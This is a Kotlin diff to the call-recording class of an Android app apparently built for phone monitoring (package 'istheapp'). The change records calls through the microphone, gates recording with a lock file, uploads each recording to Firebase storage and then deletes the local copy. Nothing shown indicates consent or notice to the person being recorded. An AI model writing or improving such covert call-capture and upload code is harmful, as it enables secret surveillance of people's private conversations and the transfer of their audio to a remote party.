@@ -37,6 +37,7 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
     private var contact: String? = null
     private var phoneNumber: String? = null
     private var type: Int = 0
+    private var recording: Int = 0
     private var dateTime: String? = null
 
     override fun startRecording(phoneNumber: String?, type: Int) {
@@ -46,31 +47,45 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
         dateTime = getDateTime()
         contact = getContext().getContactName(phoneNumber)
         fileName = getContext().getFileNameCall(phoneNumber, dateTime)
-        Log.i("llanada", "startRecording")
-        if (isAndroidM())
-            recorder.startRecording(MediaRecorder.AudioSource.VOICE_COMMUNICATION, fileName)
+        Log.i("llamada", "startRecording")
+        if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
+            recording = 1
+            if (isAndroidM())
+                recorder.startRecording( MediaRecorder.AudioSource.MIC,  fileName  ) //.VOICE_COMMUNICATION
+            else
+                recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
+        }
         else
-            recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL, fileName)
-
+            recording = 0
     }
 
     override fun stopRecording() {
-        recorder.stopRecording { sendFileCall() }
+        if (recording == 1)
+            recorder.stopRecording { sendFileCall() }
     }
 
     private fun deleteFile() {
         FileHelper.deleteFile(fileName)
-        if (getService() != null) getService()!!.stopServiceCalls()
+        if (recording == 1)
+            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
+        recording = 0
+        if (getService() != null)
+            getService()!!.stopServiceCalls()
     }
 
     private fun sendFileCall() {
         val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
-        val dateNumber = fileName!!.replace("$filePath/", "")
+        val dateNumber = fileName!!.replace("$filePath/", "").replace(",","")
         val uri = Uri.fromFile(File(fileName))
         getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
             .subscribeOn(Schedulers.io())
             .observeOn(AndroidSchedulers.mainThread())
-            .subscribe({ setPushName() }, { deleteFile() })
+            .subscribe({
+                setPushName()
+                       },
+                {
+                deleteFile()
+            })
         )
     }
 
